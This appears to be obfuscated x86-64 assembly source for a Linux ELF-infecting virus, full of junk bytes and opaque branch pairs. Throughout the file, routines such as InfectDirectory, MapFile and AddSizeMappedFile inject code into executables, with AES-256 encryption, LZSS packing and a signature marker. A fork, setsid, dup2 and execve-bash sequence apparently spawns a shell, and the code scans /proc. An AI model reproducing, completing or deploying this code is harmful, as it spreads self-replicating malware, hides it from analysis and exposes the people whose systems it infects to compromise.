    jmp         ..@AHK4JXvAb79o
..@H147ocAScqDR:
    jl          ..@QUEYYeJRCkpa
    jmp         $+4
db 0x08, 0x59
    jmp         ..@c1x7Xd47A6Qn
..@VZoqe2uHWKCb:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    jmp         ..@gLJnlSMG084e
..@TMnh6JmwCtwL:
    ret
    jmp         $+4
db 0xcb, 0x61
    jmp         $+5
db 0xf5, 0x87, 0xb6
    jmp         AddSizeMappedFile
..@VidACYbdlPPW:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    mov         edx, 100000000b
    or          bx, dx
    jmp         ..@YXqrbcOpz8Ex
..@qCNOfiZFXJGS:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    jb          ..@VQcoJ3xoyPDE
    jae         ..@VQcoJ3xoyPDE
..@ESjF0l6JHjrq:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         ..@Ugs81djG3TT2
..@u8pBQkJYtVXf:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    jmp         $+5
db 0x0b, 0x63, 0x9b
    jmp         ..@UyCQCKAQgynj
..@iK2kkl0Ffrx7:
    cmp         r2d, '../'
    jmp         ..@jxDupq2k80Px
..@LGO8J8XAMu6a:
    shr         dx, 0x4
    jmp         $+4
db 0x5f, 0x44
    jb          ..@hiHpFpAY5YeM
    jae         ..@hiHpFpAY5YeM
..@lN3NpBEFaDR0:
    add         rax, r2
    mov         r2, rax
    jmp         $+5
db 0xf1, 0x00, 0x88
    je          ..@oEmjbaNAKCDp
    jne         ..@oEmjbaNAKCDp
..@06dX8GSywGIS:
    add         rbx, 1
    jmp         $+5
db 0xc9, 0xd8, 0x7f
    jl          ..@JAOBUwiT2L08
    jge         ..@JAOBUwiT2L08
..@5nJsjTWyWKnv:
    mov         dx, WORD [rsp] 
    jb          ..@arQ5TSnb1bRI
    jae         ..@arQ5TSnb1bRI
..@FLOpcNILXmqb:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0xf
%endif
    jmp         ..@GgVrzH3DcR0C
..@f0APO7nLtR3r:
%ifndef ENABLE_DEBUGGING
    jl          ..@BIi4Qc1lzBTK
    mov         r1, rax
    mov         r2d, 0x2
%endif
    jmp         $+4
db 0x65, 0xfa
    jmp         $+3
db 0x06
    jb          ..@BBVxW8mHgrdO
    jae         ..@BBVxW8mHgrdO
..@eLgFEzyd7q5x:
    sub         r1, r4
    jmp         $+4
db 0x3f, 0xfe
    je          ..@qksdmEeAm7BI
    jne         ..@qksdmEeAm7BI
..@DmAGN0U6qbJf:
    syscall
    cmp         rax, 0xffffffffffffffff
    je          ..@kVOWXw2ijCw4
    jmp         $+4
db 0x68, 0xfa
    jmp         ..@0sityXU48VOE
..@68BGib7fT49Q:
    add         r1, r4
    cmp         BYTE [r1], 0x00
    jmp         $+3
db 0x2e
    jl          ..@FD17KuxOzPho
    jge         ..@FD17KuxOzPho
..@K6lFAIe3szu7:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         $+5
db 0x72, 0x5e, 0xad
    jmp         $+4
db 0x25, 0x87
    jmp         ..@JTu2szBC5ZjF
..@Yha9FWl7CADZ:
    mov         r1, m6
    add         r1, non_packed_len+PADDING
    jl          ..@OHRH9E5zirVX
    jge         ..@OHRH9E5zirVX
..@XBY7ld80kIUL:
    cmp         eax, 0x3
    jmp         $+4
db 0xb9, 0xaf
    js          ..@fleJZBQQXlhF
    jns         ..@fleJZBQQXlhF
UnmapFile:
    jmp         ..@huNadhI3FUbM
..@Y9NwaJU6BQ5k:
    je          ..@WJF4uIIQSfK0
    mov         rax, 2
    js          ..@gMjVfmZAa1Y0
    jns         ..@gMjVfmZAa1Y0
..@QznE75qsHekW:
%ifdef X86_32
    pop         ebp
%endif
    js          ..@zI00mwrshSLR
    jns         ..@zI00mwrshSLR
..@jxDupq2k80Px:
    je          ..@E30ij6Jqzn3b
    jmp         $+3
db 0x07
    js          ..@aY9ynhNTzNBj
    jns         ..@aY9ynhNTzNBj
..@bEiiNlD9uxbv:
    jle         ..@PwHJtqF5teoU
    je          ..@E2Rjd89HqrHi
    jne         ..@E2Rjd89HqrHi
..@DXpQ2xt9myew:
%ifndef ENABLE_DEBUGGING
    syscall
    cmp         al, 0x0
%endif
    jmp         ..@MDLqjhkzeZky
..@AHK4JXvAb79o:
    lea         r1, [rsp+_NBF_OFF.key]
    call        KeyGen
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    jb          ..@oBOEdl1pvEZw
    jae         ..@oBOEdl1pvEZw
..@IGFjYo3tye1k:
    jne         ..@cPoISx0EE5NG
    jmp         ..@cPoISx0EE5NG
..@BBVxW8mHgrdO:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_DUP2
%endif
    jmp         $+4
db 0x0d, 0x8b
    js          ..@mfBf4EUFNzAr
    jns         ..@mfBf4EUFNzAr
..@zEgvuzbBLXDi:
    mov         r1, r5
    jmp         ..@Or1n13pJQ3Sm
..@nrAsoxSX0FYK:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jl          ..@qBdYgtZxu8W4
    jmp         $+5
db 0x1e, 0x87, 0x6b
    jmp         $+3
db 0xad
    jmp         $+3
db 0xef
    jl          ..@YEicmXKXOSQB
    jge         ..@YEicmXKXOSQB
..@1ZF7Xp8nq9Id:
%ifdef X86_32
    mov         edx, esi
    mov         esi, 0x01
    mov         edi, DWORD [edi+file.filefd]
%endif
    jmp         $+4
db 0xe4, 0xd5
    jmp         $+4
db 0xe4, 0xa9
    jmp         ..@nEouFNXW3Wwt
..@M7xXvZAwbhGg:
    movdqu      xmm1, oWORD [rsp+0x20]
    jmp         $+5
db 0x44, 0xe1, 0xad
    jmp         $+3
db 0xb3
    jl          ..@31tcHa97HZry
    jge         ..@31tcHa97HZry
..@0sityXU48VOE:
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    jmp         ..@tLKzoiDXBZ3g
    jmp         ..@kVOWXw2ijCw4
..@qjsoktHcwAOS:
    cmp         WORD [r1], '..'
    jmp         ..@eai7G3BdHa3G
..@AZdvFM2eHHv8:
    jmp         ..@Br6lPc9HirVz
    jb          ..@8AEzm0TXwD7k
    jae         ..@8AEzm0TXwD7k
..@Z9ukbD04veE5:
    xor         rax, rax
    jmp         $+4
db 0xb7, 0xa2
    jmp         $+5
db 0x87, 0x82, 0x01
    js          ..@qv0p3DlcMdKx
    jns         ..@qv0p3DlcMdKx
Strcpy:
    jmp         ..@Xkt0GjblZ86l
..@eai7G3BdHa3G:
    je          ..@E30ij6Jqzn3b
    jmp         ..@eJwWz1gplYbV
..@SmlYlAcuikjz:
    rep         movsb
    js          ..@1TtS0OTbcgZt
    jns         ..@1TtS0OTbcgZt
..@saROOB9fADkw:
    jg          ..@QUEYYeJRCkpa
    add         r1, 1
    jmp         ..@quOQibrLdnQ8
..@73Ytbkw6lXmF:
    pop         r1
    jb          ..@U3gt44xB7T2g
    jae         ..@U3gt44xB7T2g
..@BwlvTXAavLGk:
    mov         rax, SYS_FORK
    syscall
    cmp         eax, 0x00
    jmp         $+5
db 0x37, 0xbb, 0x61
    jmp         ..@MDfoxp6PqmIs
..@C42cOnMjC0gb:
    pop         r1
    mov         r2, QWORD [r1+file.filesize]
    jl          ..@0bLHdUoDJjhY
    jge         ..@0bLHdUoDJjhY
..@SY34ICkNug4Q:
    GGLOBAL     _signature
    jmp         ..@r6pohx8AQQyY
..@xvxJbM11jgmi:
    aesenc      xmm0, xmm1
    jmp         $+5
db 0x5f, 0x0a, 0xdf
    jmp         $+5
db 0xbf, 0xc4, 0x5b
    jmp         ..@s4Mr12yz0bym
..@VMYQAhmQ1NBv:
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    jmp         ..@P76tyT1JznGc
..@Pliq9JOmPRtz:
    VAR         packed, procdir
    jmp         ..@emwcRm4r6qJB
..@pMGRRPDGYaS9:
    lea         r3, [rsp+_NBF_OFF.key]
    call        Aes256Encryption
    jmp         ..@JTxDhW9db7bn
..@0bLHdUoDJjhY:
    cmp         rax, r2
    jmp         $+4
db 0xc1, 0x4d
    jmp         $+5
db 0x01, 0xe9, 0x82
    jmp         $+3
db 0xea
    jmp         $+5
db 0xff, 0x5b, 0x5c
    js          ..@PEySLU2VW27t
    jns         ..@PEySLU2VW27t
..@1eYmhNR8Y5Fa:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+4
db 0xef, 0x5e
    jl          ..@eg5JyyEeGkV3
    jge         ..@eg5JyyEeGkV3
DYNPIEValidation:
    jmp         ..@szXr32xg3eqq
..@WGdYw1mTLXXC:
    mov         r2, original_virus_len+PADDING
    mov         eax, SYS_MUNMAP
    jl          ..@PBMB0aBulEui
    jge         ..@PBMB0aBulEui
..@VcEJxBAB9aPY:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         $+5
db 0xb4, 0x96, 0x7d
    jl          ..@Vbkhs6iNAf0p
    jge         ..@Vbkhs6iNAf0p
..@PXU1WMbmvPsG:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jmp         ..@eLgFEzyd7q5x
..@zeNFHO8y1qcz:
    mov         rax, SYS_FORK
    jmp         ..@js4lo3znfK0v
..@WJ9Tf121a7yA:
    call        InfectDirectory
    jmp         $+4
db 0x3e, 0xe5
    jmp         $+3
db 0x8d
    js          ..@h6TgYr4QKeAO
    jns         ..@h6TgYr4QKeAO
..@ubN0ckvAJ484:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+5
db 0x90, 0x05, 0x69
    jmp         ..@jTXiqgRzpLip
..@YXqrbcOpz8Ex:
    jmp         ..@ejI33cUbgVTO
    jmp         ..@Z9ukbD04veE5
..@kbdyNMaF4iOE:
    sub         rcx, m6
    mov         eax, 0x00
    rep         stosb
    jl          ..@XJn6rreCopGz
    jge         ..@XJn6rreCopGz
InfectDirectory:
    jmp         ..@2DSNLCwfDy5o
..@5r4FzHpNYEcf:
    call        KeyGen
    jb          ..@Sfe8U7gsYdCy
    jae         ..@Sfe8U7gsYdCy
..@yJbklaGCMzk6:
    jmp         ..@hbV4aDAkY8YZ
    jmp         $+4
db 0xe4, 0x3b
    jmp         $+5
db 0x08, 0x52, 0x9e
    jl          ..@9K0q3jp4AiVA
    jge         ..@9K0q3jp4AiVA
..@qhQmjShrbDHZ:
    aesenc      xmm0, xmm1
    jmp         ..@M7xXvZAwbhGg
..@smTya8Ld24XN:
    mov         r2, m7
    sub         r2, m6
    sub         r2, non_encrypted_len
    jmp         $+5
db 0xe0, 0x7f, 0xde
    js          ..@6GWETv1rAICJ
    jns         ..@6GWETv1rAICJ
..@NRgxR2wlH29Z:
    mov         r2w, WORD [r5+e_h.e_shnum]
    xor         rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    jl          ..@cpxWHfYQ37Vb
    jge         ..@cpxWHfYQ37Vb
..@hnQRI9eiy03T:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+5
db 0x49, 0xd9, 0x5f
    je          ..@PEQQz6Igtg7A
    jne         ..@PEQQz6Igtg7A
..@Jhxm9IhNhPfv:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@Q8mwg8XPhc55
..@OjBUNkhwwNYg:
    je          ..@0LfujBbczptF
    js          ..@vqEHGeQfU70Z
    jns         ..@vqEHGeQfU70Z
..@kzoBw6ZIodMF:
    add         rdi, rbx
    jl          ..@Iki56i5KPpsB
    jge         ..@Iki56i5KPpsB
..@r7jBTaQMtkMh:
    pop         r4
    jmp         ..@QXEa7GGbJfoZ
..@K89lHWAE2v1G:
    jmp         ..@73Ytbkw6lXmF
    jmp         ..@zeNFHO8y1qcz
..@WJF4uIIQSfK0:
    xor         rax, rax
    jmp         ..@NwLvwrtQ98S1
..@RCqmn8AMJ6lZ:
    xor         rbx, rbx
    jmp         $+4
db 0xa9, 0x90
    jmp         $+5
db 0x1d, 0xf5, 0x7d
    je          ..@DPmRyQvwDTLI
    jne         ..@DPmRyQvwDTLI
..@FD17KuxOzPho:
    je          ..@QtPPrQ7ZMsxf
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jmp         ..@L2SBbWgiepwM
..@2Ypbj485B4b6:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x40]
    jmp         $+5
db 0x21, 0xf4, 0x97
    jmp         ..@bl0DTHrUGk6X
..@Sfe8U7gsYdCy:
    xor         r2, r2
    xor         r3, r3
    mov         r1, m6
    jmp         ..@dCvKl2HqrL6r
..@3hfmlIhg3IT1:
    cmp         rax, (-1)
    jmp         $+4
db 0xe5, 0x95
    jl          ..@C3v33JlnEity
    jge         ..@C3v33JlnEity
..@HmAJh82KnjZz:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
    jl          ..@BIi4Qc1lzBTK
%endif
    jmp         $+3
db 0x6b
    jmp         ..@AmckUwhgQCux
..@4Tlj3qo4fRB5:
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jl          ..@GVnjjJMGUJU4
    jge         ..@GVnjjJMGUJU4
..@QHHMANi8fJFn:
    mov         r1, m6
    add         r1, non_encrypted_len
    jmp         $+4
db 0x3b, 0xf9
    jmp         $+3
db 0xa7
    jmp         $+5
db 0x8e, 0xf8, 0xb4
    jmp         ..@smTya8Ld24XN
..@cvC87pmZSOfx:
    mov         r4, 0
    jmp         $+5
db 0x45, 0x3b, 0x60
    jb          ..@WLn2wz0X9usv
    jae         ..@WLn2wz0X9usv
..@V0ftHA7ce6cV:
    xor         r1, r1
    jmp         $+4
db 0x41, 0xa8
    jl          ..@YviMrODLMqEe
    jge         ..@YviMrODLMqEe
..@maBWiRmgPekP:
    call        MapFile
    jmp         $+4
db 0x07, 0xc2
    js          ..@nzAE5L64j0Q7
    jns         ..@nzAE5L64j0Q7
..@2A9j6uQTdKms:
    sub         rbx, r3
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    jmp         $+3
db 0x96
    js          ..@KG3TZN0a15V8
    jns         ..@KG3TZN0a15V8
..@2Avt8e2aBmMY:
    VAR         packed, dirs_tmp
    jmp         ..@7KHSEpiFze86
..@Y6o5GXTWsNHE:
    push        rbp
    mov         rbp, [rbp]
    call_vsp    Aes256KeyExpansion
    jmp         $+3
db 0x7a
    jb          ..@U6YxACR1Ik8W
    jae         ..@U6YxACR1Ik8W
..@yzNTsmZGMoog:
%ifdef X86_64
    mov         edx, 11b
%endif
    jmp         $+4
db 0x00, 0x9d
    jmp         $+4
db 0x53, 0x99
    jb          ..@9lcKHhXvl6dv
    jae         ..@9lcKHhXvl6dv
..@oI0LawZFaH0V:
%ifndef ENABLE_DEBUGGING
    syscall
    test        eax, eax
%endif
    jmp         $+5
db 0xbb, 0x67, 0x24
    jb          ..@lAVV4vVXH0EA
    jae         ..@lAVV4vVXH0EA
..@joNHi7MmvWOP:
    mov         DWORD [rdi], eax
    jl          ..@VqaDuQ7o7ARH
    jge         ..@VqaDuQ7o7ARH
..@WF9BP9IqrEW9:
    call        DYNPIEValidation
    test        rax, rax
    jnz         ..@WJF4uIIQSfK0
    je          ..@dN3Qf2HAIQLh
    jne         ..@dN3Qf2HAIQLh
..@X9Tw0Go5RU9Z:
    xor         rax, rax
    jmp         $+5
db 0x39, 0xfa, 0x08
    je          ..@P8Dp4u2a1UWz
    jne         ..@P8Dp4u2a1UWz
..@dUSx78xm8kPf:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start
    js          ..@tQet3rk47QBZ
    jns         ..@tQet3rk47QBZ
..@g7QjfTtRbkNK:
    cmp         rax, 0
    jmp         $+4
db 0xaf, 0x26
    jmp         ..@izGKAKTxQait
..@em71qUjtpKIu:
    mov         DWORD [rdi], esi
    jmp         $+3
db 0x70
    jmp         $+4
db 0x5b, 0x61
    jmp         $+3
db 0x3b
    jmp         ..@jvi2KM3Mlj7a
..@i1islUIBTYyI:
    jl          ..@Z4XCWgGkB3Tv
    jmp         $+5
db 0xb4, 0x7e, 0x32
    jmp         ..@8gZRoKFG6wsH
..@puq1Qm76DsSI:
    mov         QWORD [r2+p_h.p_filesz], r4
    js          ..@Ad4FUIy3sqBv
    jns         ..@Ad4FUIy3sqBv
..@tMNHkbkHyGrC:
    and         r4, 10b
    OFILE       QWORD [r2], r4
    je          ..@XBY7ld80kIUL
    jne         ..@XBY7ld80kIUL
..@a5Iwvk3QMFiK:
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    jmp         $+4
db 0x2a, 0xc2
    jmp         ..@RqTYQs6tUpbK
..@Iw70MRih8wg4:
%ifdef X86_32
    mov         edx, 11b
%endif
    jmp         $+3
db 0xf8
    jmp         ..@clCscZAAAk7Q
..@vLnJJ1gxc2L1:
    push        r5
    push        r2
    push        r1
    jmp         $+4
db 0x4e, 0x2d
    jmp         $+3
db 0xc6
    js          ..@KF5QKahOtSk4
    jns         ..@KF5QKahOtSk4
..@MBvNcF1U7xpZ:
    xor         rax, rax
    jmp         $+4
db 0xa1, 0x32
    je          ..@l3n1KNaAG7sS
    jne         ..@l3n1KNaAG7sS
..@WG8iNeOwxfVr:
    add         eax, 0x30
    jmp         $+3
db 0x5f
    jmp         ..@VEIJOp0u38dQ
..@7hgAnoEViXG2:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+3
db 0xa3
    jmp         $+3
db 0x3a
    jmp         ..@i4JnkiPpN4zA
..@uh4dBdsUERpF:
    add         rdi, _signature.index-_signature.start
    jl          ..@joNHi7MmvWOP
    jge         ..@joNHi7MmvWOP
..@j8tiyTfD7Ulq:
    test        eax, eax
    jmp         $+3
db 0xdb
    jmp         ..@vrpT4ZHnQJXE
..@NleDm9Ak4XJH:
    push        r2
    jmp         $+3
db 0xa5
    jmp         ..@fin2Dmz4jUtm
..@ffknvUB0mwSz:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         eax, SYS_SETSID
    syscall
%endif
    jl          ..@VMVhtNrfOeXd
    jge         ..@VMVhtNrfOeXd
..@9ZzTNmaeHrmd:
    xor         r4, r4
    jmp         ..@6OMAx7X3I9ky
..@7iwjXC1Rxb9L:
    jne         ..@WJF4uIIQSfK0
    cmp         BYTE [r1+5], '/'
    jmp         $+3
db 0x22
    jmp         ..@VTKoA7vPTlKI
..@4eZFVVaFbUAt:
    xor         r4, r4
    jb          ..@POzCQcpoxMog
    jae         ..@POzCQcpoxMog
..@N7HWmUkCqryW:
    mov         r2, 11b
    call        MapFile
    cmp         rax, 0
    jmp         $+3
db 0xca
    js          ..@Mox1LWUGbVeJ
    jns         ..@Mox1LWUGbVeJ
..@4wlwK3jBAFOm:
    add         r2, _virus-_start
    mov         r3, _decrypt-_virus
    call_vsp    Aes256KeyCreation
    js          ..@QHHMANi8fJFn
    jns         ..@QHHMANi8fJFn
..@jFhi3kJLvhO9:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jl          ..@Qgz56krrUpLW
    jge         ..@Qgz56krrUpLW
..@v4z0Ea0OrKT8:
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@pMGRRPDGYaS9
..@JKdIV4a05Lik:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+4
db 0x68, 0x2b
    jmp         $+3
db 0x01
    jmp         ..@72tZlES2W3K1
..@lpEZO6FY5qlf:
    ret
    jl          KeyGen
    jge         KeyGen
..@yECeu9Xfjeao:
    cmp         QWORD m6, 0x00
    jmp         $+5
db 0xc9, 0x77, 0x4b
    jmp         $+5
db 0x0a, 0xeb, 0x2d
    jb          ..@gmiTegOBaTF8
    jae         ..@gmiTegOBaTF8
..@tk0cT7DD9r0P:
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    mov         ecx, 0x8
    jmp         $+4
db 0x96, 0x60
    jmp         $+3
db 0xeb
    jmp         ..@ZZK0EEGOtQKp
..@MDfoxp6PqmIs:
    jl          ..@0MGfSq8YL8ka
    je          ..@zeNFHO8y1qcz
    jmp         $+3
db 0x00
    jb          ..@rD1we2dpyOkQ
    jae         ..@rD1we2dpyOkQ
..@gMjVfmZAa1Y0:
    ret
    jmp         ..@WJF4uIIQSfK0
..@9fAwxSqhOXhg:
    xor         rcx, rcx
    mov         rdi, m6
    add         rdi, key-_start
    jmp         ..@tk0cT7DD9r0P
..@sTYTvqVwhy4H:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+4
db 0xfc, 0x73
    js          ..@qWjr5YVYFDfO
    jns         ..@qWjr5YVYFDfO
..@gLJnlSMG084e:
    pop         r4
    jmp         $+4
db 0x38, 0xd8
    js          ..@8wufH4GiCeH3
    jns         ..@8wufH4GiCeH3
..@DVZng0lUFXBo:
    jnz         ..@kVOWXw2ijCw4
    jb          ..@6ZwOl9Ef3bpF
    jae         ..@6ZwOl9Ef3bpF
..@k1OZM1hC2TKe:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    jmp         ..@rrwLUpGDIJaZ
..@Mqn6xwOOgQjq:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+3
db 0x24
    jmp         $+3
db 0x1f
    jb          ..@DLu5Q6gkwTqr
    jae         ..@DLu5Q6gkwTqr
..@FgjYmiKNfYwJ:
    mov         rsi, rdi
    jl          ..@kzoBw6ZIodMF
    jge         ..@kzoBw6ZIodMF
..@vMdDTLBr282Y:
    jne         ..@Mqn6xwOOgQjq
    add         r2, rax
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    jl          ..@5sFZgNPH4t8b
    jge         ..@5sFZgNPH4t8b
..@ayM2M2zqLmtG:
    mov         r2, original_virus_len-non_packed_len
    call        LzssEncoder
    mov         rdi, m6
    jmp         $+3
db 0x65
    js          ..@jrnrldkflTPE
    jns         ..@jrnrldkflTPE
..@8gZRoKFG6wsH:
    jmp         ..@Q8mwg8XPhc55
    jmp         $+5
db 0x07, 0xaa, 0x67
    jmp         $+3
db 0x14
    js          ..@uVJFiUsRVaHF
    jns         ..@uVJFiUsRVaHF
..@I9CJGnk2o3kR:
    and         eax, 0xff
    jmp         $+3
db 0x7f
    js          ..@CWq5y0ME7YYN
    jns         ..@CWq5y0ME7YYN
..@7Xa9Evxu0WJB:
    je          ..@hbV4aDAkY8YZ
    jmp         $+4
db 0x8c, 0x59
    js          ..@ZHGwQRN0rJFY
    jns         ..@ZHGwQRN0rJFY
..@bHEpACJkpI1r:
    jmp         ..@WJF4uIIQSfK0
    jmp         ..@WF9BP9IqrEW9
..@m6bLiJYpCSrC:
    add         r5, rax
    jmp         ..@f4P8Rw9AkV2j
..@cX4JfmBgWqmk:
    cmp         BYTE [r1], 0x30
    jb          ..@H147ocAScqDR
    jae         ..@H147ocAScqDR
..@gRPjb276GleC:
    ret
    jmp         $+4
db 0xf6, 0x67
    jl          Aes256Encryption
    jge         Aes256Encryption
..@PCD4avutFVRp:
    call        DestroyPayload
    jmp         ..@wQDsr1hFEvJo
..@B0BADypkjmYD:
    add         rsp, _DYNPIE_OFF_size
    jb          ..@CzbFcT5lSEtf
    jae         ..@CzbFcT5lSEtf
..@hRFPjjkMTOg2:
    xor         r1, r1
    jmp         $+5
db 0x1e, 0x03, 0x1d
    jb          ..@X4R4p6ICWnWA
    jae         ..@X4R4p6ICWnWA
..@CgPtTv5ofqBI:
    pop         r3
    pop         r4
    pop         r5
    js          ..@lpEZO6FY5qlf
    jns         ..@lpEZO6FY5qlf
..@kq9FrPZ4u8pb:
    mov         r3, r2
    mov         r2, QWORD [r5+file.filesize]
    je          ..@6a3J6F7Co3aX
    jne         ..@6a3J6F7Co3aX
..@ZHGwQRN0rJFY:
    cmp         rdi, rsi
    jmp         ..@TABDxBA5ikCv
..@DGTTzc0sw22x:
    movdqu      xmm0, [rsi+rcx]
    jmp         $+3
db 0xa7
    jb          ..@14XK4MmFaGjZ
    jae         ..@14XK4MmFaGjZ
..@JXJ7MHej4bkN:
    mov         r2, QWORD [r1+e_h.e_phoff]
    jmp         $+3
db 0x48
    jb          ..@6DdhiHy1mt0i
    jae         ..@6DdhiHy1mt0i
DestroyPayload:
    jmp         ..@ri7BCpvZYX6a
..@fbAUubcjxq8O:
    mov         r2, signature_len
    call        AddSizeMappedFile
    jmp         ..@GMcmu2wDUtO9
..@KF5QKahOtSk4:
    mov         r5, QWORD [r1+file.fileptr]
    mov         r1, QWORD [r5+e_h.e_shoff]
    js          ..@BOa7Y7ZTSMkj
    jns         ..@BOa7Y7ZTSMkj
..@s6kFJdnEjdps:
    lea         r4, [r1]
    add         r4, r3
    xor         r2, r2
    jl          ..@QM7PXhDYdGte
    jge         ..@QM7PXhDYdGte
..@vqEHGeQfU70Z:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+5
db 0x57, 0xdd, 0xf3
    jmp         ..@KfCbng6CNFel
..@AWVrKPqADb2g:
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         ..@st7z9tCaDC3K
    je          ..@G2vj5Dap1mbM
    jne         ..@G2vj5Dap1mbM
..@v6ZbLzMJEWw6:
    cmp         QWORD m7, 0x00
    je          ..@wQDsr1hFEvJo
    jmp         $+4
db 0x91, 0x8d
    jmp         $+3
db 0x6c
    jmp         ..@fTlO7KAm4tDj
..@HlhUgkYDgwc2:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    js          ..@07UY41zgZb2A
    jns         ..@07UY41zgZb2A
..@g4ZkBrAhtDJq:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, original_virus_len+PADDING
%endif
    jmp         ..@yzNTsmZGMoog
..@fleJZBQQXlhF:
    jl          ..@RK2S7dpTmzdB
    mov         r4, r5
    mov         r5, [rsp]
    jb          ..@NPVLgMXBV4JG
    jae         ..@NPVLgMXBV4JG
..@o1nuGAlPZHyF:
%ifndef ENABLE_DEBUGGING
    syscall
    test        eax, eax
    jnz         ..@JKdIV4a05Lik
%endif
    jmp         $+4
db 0x22, 0xc2
    jmp         $+3
db 0xd0
    jb          ..@ffknvUB0mwSz
    jae         ..@ffknvUB0mwSz
..@uMXfxxT6Y1Mn:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jb          ..@qvOFX4grJPqR
    jae         ..@qvOFX4grJPqR
..@IHJxj5XHqdKb:
    test        al, al
    jnz         ..@WJF4uIIQSfK0
    mov         rax, 1
    jmp         $+5
db 0x7b, 0x8f, 0xbd
    jb          ..@dRQooXakfUsK
    jae         ..@dRQooXakfUsK
..@MNCiMLZSGgAy:
%ifndef ENABLE_DEBUGGING
    VAR         packed, bash
    mov         r1, r5
    mov         eax, SYS_EXECVE
%endif
    jl          ..@OHnaW7YCywLT
    jge         ..@OHnaW7YCywLT
..@knOu1GohVdTt:
    xor         rax, rax
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    jmp         $+3
db 0x36
    jmp         ..@m6bLiJYpCSrC
..@yKiiobSIQrpu:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    jmp         ..@7Ai5AiqIqJSU
..@L2SBbWgiepwM:
    call_vsp    Strlen
    mov         r3, rax
    jl          ..@R10u59LJLKQf
    jge         ..@R10u59LJLKQf
..@hiHpFpAY5YeM:
    add         ecx, 1
    cmp         cl, 0x4
    jl          ..@gCW16cbR8rLD
    jge         ..@gCW16cbR8rLD
..@BOa7Y7ZTSMkj:
    xor         r2, r2
    jl          ..@NRgxR2wlH29Z
    jge         ..@NRgxR2wlH29Z
..@qL1jxGp71W1E:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+5
db 0x97, 0xf5, 0xdf
    jmp         $+3
db 0x7c
    jb          ..@aRvCfUMWPMLQ
    jae         ..@aRvCfUMWPMLQ
..@ZJHaugqdp65y:
    jl          ..@WG8iNeOwxfVr
    jmp         $+4
db 0x48, 0x73
    jmp         $+4
db 0xf3, 0xf5
    jl          ..@BcA3RGckqAXi
    jge         ..@BcA3RGckqAXi
..@cS6dkXeubave:
    mov         r2, vsp
    jl          ..@rgP6PG4rtspo
    jge         ..@rgP6PG4rtspo
..@uVJFiUsRVaHF:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         ..@fr5lmv2eRJt9
..@Pp31OzprdfpK:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         $+3
db 0x8d
    jmp         $+3
db 0xc8
    je          ..@oZgxvQMygqvM
    jne         ..@oZgxvQMygqvM
..@KQz0eXDjx6J9:
    jle         ..@4KJW7e21bp4E
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    jmp         $+5
db 0x8f, 0x97, 0x07
    jl          ..@GIDJYLGMBFuu
    jge         ..@GIDJYLGMBFuu
..@Mox1LWUGbVeJ:
    jne         ..@nfozY7oOHVSv
    jl          ..@JWx1wHZJMqn6
    jge         ..@JWx1wHZJMqn6
..@mHrQUtF1N0yS:
    jmp         ..@wQDsr1hFEvJo
    jmp         $+3
db 0x74
    jmp         $+3
db 0xaf
